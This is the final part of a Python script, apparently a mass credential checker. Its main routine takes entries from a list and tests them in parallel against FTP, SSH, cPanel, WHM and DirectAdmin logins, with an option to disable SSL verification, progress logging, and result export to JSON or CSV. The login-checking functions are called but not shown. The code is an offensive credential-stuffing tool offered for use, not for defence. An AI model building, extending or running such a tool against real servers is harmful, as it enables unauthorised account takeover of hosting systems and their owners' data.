        log_message(f"Using {args.threads} threads for testing", "INFO")
        log_message(f"Timeout set to {args.timeout} seconds", "INFO")
        
        # Determine services to test (backward compatibility)
        services_to_test = [s.strip().lower() for s in args.services.split(',')]
        valid_services = ['ftp', 'ssh', 'cpanel', 'whm', 'directadmin']
        services_to_test = [s for s in services_to_test if s in valid_services]
        
        if not services_to_test:
            log_message("No valid services specified", "ERROR")
            return 1
        
        log_message(f"Testing services: {', '.join(services_to_test)}", "INFO")
        log_message("Starting enhanced credential validation...", "INFO")
        log_message("", "INFO")
        
        # Setup shared session for web services
        web_session = setup_session(args.timeout, not args.no_ssl_verify, args.max_retries)
        
        # Execute checks with enhanced thread pool and progress tracking
        total_tasks = len(list_data) * len(services_to_test)
        completed_tasks = 0
        
        log_message(f"Queuing {total_tasks} total tasks across {len(services_to_test)} services", "INFO")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = []
            
            for line in list_data:
                if shutdown_requested:
                    break
                
                # Submit tasks for each enabled service
                if 'ftp' in services_to_test:
                    futures.append(('ftp', executor.submit(check_ftp, line, args.timeout)))
                if 'ssh' in services_to_test:
                    futures.append(('ssh', executor.submit(check_ssh, line, args.timeout)))
                if 'cpanel' in services_to_test:
                    futures.append(('cpanel', executor.submit(check_login, line, 'cpanel', web_session, args.timeout, not args.no_ssl_verify)))
                if 'whm' in services_to_test:
                    futures.append(('whm', executor.submit(check_login, line, 'whm', web_session, args.timeout, not args.no_ssl_verify)))
                if 'directadmin' in services_to_test:
                    futures.append(('directadmin', executor.submit(check_directadmin, line, web_session, args.timeout, not args.no_ssl_verify)))
            
            # Wait for completion with progress tracking
            log_message(f"Processing {len(futures)} tasks...", "INFO")
            
            for future_info in concurrent.futures.as_completed([f for s, f in futures]):
                if shutdown_requested:
                    break
                try:
                    future_info.result()
                    completed_tasks += 1
                    
                    # Log progress every 25 tasks or major milestones
                    if completed_tasks % 25 == 0 or completed_tasks in [1, 10, 50, 100]:
                        progress_pct = (completed_tasks / len(futures)) * 100
                        log_message(f"Progress: {completed_tasks}/{len(futures)} tasks completed ({progress_pct:.1f}%)", "INFO")
                        
                except Exception as e:
                    log_message(f"Task execution error: {e}", "ERROR")
                    completed_tasks += 1
        
        # Print final statistics
        log_message("", "INFO")
        log_message("Testing completed successfully!", "INFO")
        print_stats()
        
        # Save structured results if requested
        if args.output_format in ['json', 'csv']:
            save_structured_results(args.output_format, args.output_file)
        
        return 0
        
    except KeyboardInterrupt:
        log_message("Testing interrupted by user", "INFO")
        print_stats()
        return 1
        
    except Exception as e:
        error_message = f"Critical error during program execution: {e}"
        log_message(error_message, "ERROR")
        return 1

if __name__ == '__main__':
    exit_code = main()
    sys.exit(exit_code)
